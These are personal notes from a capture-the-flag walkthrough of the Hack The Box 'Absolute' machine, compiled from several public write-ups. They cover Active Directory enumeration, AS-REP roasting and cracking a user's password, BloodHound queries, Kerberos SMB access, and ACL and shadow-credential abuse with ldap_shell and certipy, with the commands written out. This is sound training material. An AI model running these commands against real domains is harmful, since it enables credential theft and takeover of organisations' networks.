# Absolute Helped-Through

Name: Absolute
Date:  
Difficulty:  Insane - but not hard as when released due to AD hacking Tool issues
Goals:  
- Silver, Golden, Diamond and Sapphire Tickets 
Learnt:
- [tron for Cleaning you Windows](https://github.com/bmrf/tron)
- `grep -B $LinesBefore -A $LinesAfter `
Beyond Root:
- Silver, Golden, Diamond and Sapphire Tickets
- Author and manage a Azure Policy for Kerberos and research that
- Make a DC for a Vulnerable machine I want to make - plus the: 
	- Docker containerise windows work station and kubernetes a web app for Vulnerable machine I want to template out and make
	- Windows Privilege Escalation HTB academy for Workstation

Twinned with [[Response-Helped-Through]]

- [[Absolute-Notes.md]]
- [[Absolute-CMD-by-CMDs.md]]


[Ippsec Video](https://www.youtube.com/watch?v=rfAmMQV_wss)
[Alh4zr3d Stream](https://www.twitch.tv/videos/1855594279)
[0xDF Written Writeup](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html)


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Alh4zr3d: Starts with CME
```bash
crackmapexec smb $IP -u '' -p ''
crackmapexec smb $IP -u '' -p '' --shares 
```
No guest access to shares, but we have host OS information
![](cmebaseenum.png)

Alh4zr3d: Background UDP scan 
```bash
sudo nmap -sU -p- -oG nmap/udp-full $IP --min-rate 300 
```

DNS recon
```bash
nslookup
dig axfr dc.absolute.htb @10.129.228.64
dig axfr absolute.htb @10.129.228.64
```

And the outputs:
![](nslookup.png)

![](nodomaintransfer.png)

All:
```bash
# /etc/hosts
$IP DC.absolute.htb absolute.htb
```

Alh4zr3d:
```bash
ldapsearch -x -b "dc=absolute,dc=htb" -H ldap://$IP
gobuster dir -u http://absolute.htb -w /usr/share/seclist/
gobuster vhost -u  http://absolute.htb -w /usr/share/seclist/
```

Similarly fruitless as the above, but for the sake of completeness
![](norpcnullauth.png)

0xdf:
```bash
for i in $(seq 1 6); do wget http://absolute.htb/images/hero_${i}.jpg; done
```

Ippsec:
```bash
wget -r http://absolute.htb
find . -type f -exec exiftool {} \; grep Author | awk -F: '{print $2}' | sed 's/^ //g' > ../users.txt
```

I decided for
```bash
exiftool www/images/hero* > exiftoolOnAllheroJPGs.out
cat exiftoolOnAllheroJPGs.out | grep 'Author' | awk -F: '{print $2}' | sed 's/^ //g' > fullnames.txt
```

Ippsec and 0xDF: [Username Anarchy](https://github.com/urbanadventurer/username-anarchy.git), have not tried this I used it with similar positive results
```bash
cp users.txt ua-input.txt
sed -i 's/ /,/g' ua-input.txt
git clone
ruby username-anarchy/username-anarchy -i ua-input.txt -f flast,f.last,first.last,last.first > potential-usernames.txt 
```

Alh4zr3d: Namemash 
```bash
python3 namemash.py ua-input.txt > nm-potential-usernames.txt
```

Ippsec and Alh4zr3d:
```bash
# Beware of Docker container time sync is required if you used containerised solutions
# Check
sudo ntpdate dc.absolute.htb
# Sync
sudo ntpdate -s dc.absolute.htb
# Reset with
```

Ippsec and Alh4zr3d: Kerbrute to enumerate users and get potential ASREProastable users
```bash
git clone
cd kerbrute 
go build

./kerbrute userenum --dc dc.absolute.htb -d absolute.htb potential-usernames.txt -o kerbrute.out
```

![](berbruteusernames.png)

Ippsec:
```bash
cat kerbrute.out |grep USERNAME | awk '{print $7}' > valid-users.txt
```

Ippsec - this requires the same version of Kerbrute as Ippsec the latest does:
```bash
# For Kali or Parrot git clone and build with `go build`
./kerbrute userenum --dc dc.absolute.htb -d absolute.htb valid-users.txt --downgrade -o kerbrute-dg-asreproast.out
```

0xDF: Impacket can also do this:
```bash
impacket-GetNPUsers -request -usersfile .txt -dc-ip $IP -d absolute.htb/
```

[Viperone AS-REP roasting](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/as-rep-roasting)

AS-REP roast successful against d.klay
![](dklayimpakcetasreproast.png)

[Hashcat examples](https://hashcat.net/wiki/doku.php?id=example_hashes) plus `CTRL + F -> krb5asrep$23`
![](findthehashcatmode.png)
```bash
# Hashcat auto was correct
hashcat dklay.hash /usr/share/wordlists/rockyou.txt
```
And cracked..
![](krackedklay.png)

First credentials
```
d.klay : Darkmoonsky248girl
```

Then used with cme to prove sync date and time is important
![](provedateandtime.png)



Ippsec and Alh4zr3d: 
```bash
# cme -k kerberos authentication
crackmapexec smb 10.129.228.64 -k -u d.klay -p 'Darkmoonsky248girl' 
# Either this is protect users account or more likely ntlm is disabled - it is a protected users account
crackmapexec smb 10.129.228.64 -k -u d.klay -p 'Darkmoonsky248girl' --shares
crackmapexec smb 10.129.228.64 -k -u d.klay -p 'Darkmoonsky248girl' --rid-brute

crackmapexec ldap 10.129.228.64 -k -u d.klay -p 'Darkmoonsky248girl' --bloodhound -ns 10.129.228.64 --collection All
```

Ippsec: Get TGT for d.klay
```bash
impacket-getTGT
```

Ippsec and Alh4zr3d: BloodHound.py
```bash
KRB5CCNAME=d.klay.ccache python3 /opt/Bloodhound.py/bloodhound.py -k -dc dc.absolute.htb -ns $IP -c all -d absolute.htb -u d.klay > /tmp/
```

Check BloodHound as knowing the path ahead helps guide us.  Ippsec mentions manual parsing and his video: [Manually Parse Bloodhound Data with JQ to Create Lists of Potentially Vulnerable Users and Computers](https://www.youtube.com/watch?v=o3W4H0UfDmQ)

Bloodhound Debug mode to show Cipher Query
`Settings -> Tick Debug Mode`

Ippsec: Think like a list instead of a graph
```bash
# Convert Integers
(INT|tostring)
# Display all json nicely
cat user.json | jq .
# Put query at the end of the syntax
# Show the Keys 
cat user.json | jq '. | keys'
# Show all the data key
cat user.json | jq '.data'
# Show all the data key as a list - removes the external data{ ..json..}
cat user.json | jq '.data[]'
# Dump all names
cat user.json | jq '.data[].Properties | .name'
# All enabled accounts
cat user.json | jq '.data[].Properties | select( .enabled == true) | .name'
# All disabled accounts
cat user.json | jq '.data[].Properties | select( .enabled == false) | .name'
# All enabled accounts with descriptions may contain passwords
cat user.json | jq '.data[].Properties | select( .enabled == true) | select( .description != null) | .name + " " + .description'
# Enumerating accounts approximate logons and pwdlastset 
# Beware lastlogon is not replicate between DC
# lastlogontimestamp is replicated every two weeks
# Avoid honeypots are never logged in!
# Bruteforce accounts?
cat user.json | jq '.data[].Properties | select( .enabled == true) |  | .name + " " + (.lastlogontimestamp|tostring)'
# Output where pwdlastset is greater 
cat user.json | jq '.data[].Properties | select( .enabled == true) | select(.pwdlastset > .lastlogontimestamp)| .name + " " + (.lastlogontimestamp|tostring) '
# Get all Kerberoastable accounts
cat user.json | jq '.data[].Properties | select( .serviceprinciplenames != []) | .name'

# Show all machines annd there OSes
cat computers.json | jq '.data[].Properties | .name +  ":" + .operatingsystem'
# Find all non Windows 10 pro
cat computers.json | jq '.data[].Properties | select( . operatingsystem != "Windows 10 Pro") |  .name +  ":" + .operatingsystem'

# lastlogontimestamp for machine is the last time that machine was powered on
cat computers.json | jq '.data[].Properties | .name + ":" + (.lastlogintimestamp|tostring)'
# use EpochConverter too convert
# Check which machine have been on compared to a epoch
cat computers.json | jq '.data[].Properties | select( .lastlogintimestamp > $EPOCH) | .name'
```

Alh4zr3d: Bloodhound
```bash
Set d.klay as owned
First degree group members # d.klay is stockimage photographer lmao (he is a member of photographer group)
d.klay has no outbound object control
...
no kerberoastable accounts..
```

Alh4zr3d: `jq` manual Bloodhound as well
```bash
# List of all users - I added the grep & mattdep_ sugesst -r to remove quotes for jq
cat users.json | jq -r '.data[].Properties.samaccountname' | grep -v 'null'
cat users.json | jq -r '.data[].Properties.description' | grep -v 'null'
```

Forget/Did not know you could grepping for lines before and after a pattern, find on windows can do this. 
```bash
grep -B $LinesBefore -A $LinesAfter 
```

Ippsec: Get the password
```bash
cat user.json | jq '.data[].Properties | select( .enabled == true) | select( .description != null) | .name + " " + .description'
```

Target the winrm_user account and there was a password for smb_svc in the description ...
```
 : 
```

Alh4zr3d: 
```bash
crackmapexec smb -u smb_svc -p '' 
crackmapexec smb -u smb_svc -p '' -k  --shares
```

Check Bloodhound for smb_svc permissions and groups.

Alh4zr3d - but did not work: 
```bash
# -k is deprecated for smbclient, --use-kerberos=required|desired|off
smbclient //absolute.htb/Shared -U 'svc_smb' --use-kerberos=required
```

Alh4zr3d Kinit and impacket-smbclient
```bash
# Kinit
sudo apt-get install krb5-user

# sudo vim /etc/krb5.conf

impacket-smbclient -dc-ip $IP -k absolute.htb/smb@smb_svc@dc.absolute.htb/Shared
```


Ippsec: LDAPsearch
```bash
# Provide password
kinit d.klay
/etc/hosts # must have dc.absolute.htb first
ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b="cn=users,dc=absolute,dc=htb" "users" "description"
```

Ippsec: Get a ticket for svc_smb account
```bash
impacket-GetTGT absolute.htb/svc_smb
```

Ippsec: 
```bash
KRB5CCNAME=svc_smb.ccache impacket-smbclient -K absolute.htb/svc_smb@$IP -target-ip $IP
# 
KRB5CCNAME=svc_smb.ccache impacket-smbclient -K absolute.htb/svc_smb@dc.absolute.htb -target-ip $IP
```

Ippsec: Python Virtual environments to manage impacket libraries and versioning
```python
python3 -m venv vmenv

source .env/bin/activate 
pip install .

# deactivate # To deactivate virtual environment
```


Before transfering to a Windows VM Alh4zr3d did:
```bash
file test.exe
string test.exe
```

Ippsec: Sharing VPN with Window guest to your Linux guest 
```bash
# Check if IP fowarding is enabled 
cat /proc/sys/net/ipv4/ip_forward
# Enable IP forward
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
# Iptables rules 
# INTERFACE is whatever network device that is providing internet to your nic from `ip a`
# INF-IP is INTERFACE ip not include CIDR range
# RANGE is the range choosen or the CIDR range from INTERFACE
sudo iptables -A FORWARD -i tun0 -o $INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i $INTERFACE -o tun0 -j ACCEPT
# Create masquerade/NAT rule to deal with connection not rewriting the ip adderss as Linux box is gateway, but not handling addresses
sudo iptables -t NAT -A POSTROUTING -s INF-IP/RANGE -o tun0 -j MASQUERADE
```

[[Sharp-Helped-Through]] has more verbose instructions
Ippsec: 
```powershell
# Create route on Windows machine
route add 10.10.10.0/23 mask 255.255.254.0 gw $LINUXIP
```

Ippsec: Ippsec reconfigured a network adaptor, but you could also add entries into /etc/hosts on windows
```powershell
C:\Windows\System32\drivers\etc\hosts
```

Alh4zr3d, but then had configure an interface like Ippsec - Research!!! :
```powershell
# DNS blackhole test.exe
# Administrator terminal
powershell.exe  
echo "127.0.0.1 dc.absolute.htb absolute.htb" >> C:\Windows\System32\drivers\etc\hosts
# test.exe is not using the hosts file
```

https://kevincurran.org/com320/labs/dns.htm


Ippsec and Alh4zr3d: Wireshark

Packet capture with `netsh`
```powershell
netsh
```


Bloodhound check `m.lovegod` find the shadow credentials. Ippsec: DACLEdit


Alh4zr3d `pipx` showcase that I do not want to replicate: - [ldap_shell](https://github.com/PShlyundin/ldap_shell)
```bash
# Almost did
# git clone https://github.com/z-Riocool/ldap_shell.git
# ldapmodify + ldapsearch
ldap_shell -dc-ip $IP -k -no-pass dc.absolute.htb absolute.htb/m.lovegod@dc.absolute.htb
get_group_users NETWORK AUDIT
set_genericall 'NETWORK AUDIT' m.lovegod
exit
ldap_shell -dc-ip $IP -k -no-pass dc.absolute.htb absolute.htb/m.lovegod@dc.absolute.htb
add_user_to_group m.lovegod 'NETWORK AUDIT'
# Tickets probably expired so requires password
certipy shadow auto -k -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb -account winrm_user -p ''
```

Ippsec: Certipy to add shadow credential to winrm
```bash
KRB5CCANME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb -account winrm_user
```


KRBRelay 

https://www.youtube.com/watch?v=rfAmMQV_wss 


## Beyond Root

What are shadow credentials - https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials

Create and configure a DNS server  `dnscmd`
https://learn.microsoft.com/en-us/windows-server/networking/dns/quickstart-install-configure-dns-server?tabs=powershell


## Testing to then design of Vulnerable Machine(s)

OSCP level Windows and Active Directory Jungle Gym

- Make OSCP level 
- Have good theme
- Make the Kubenetes, docker container only for pivoting not for escaping
- Make uber vulnerable switch once completed
- Ascii Art of completion

test ad-init-recon and psrev-obfus scripts
test dns-axfr and improve
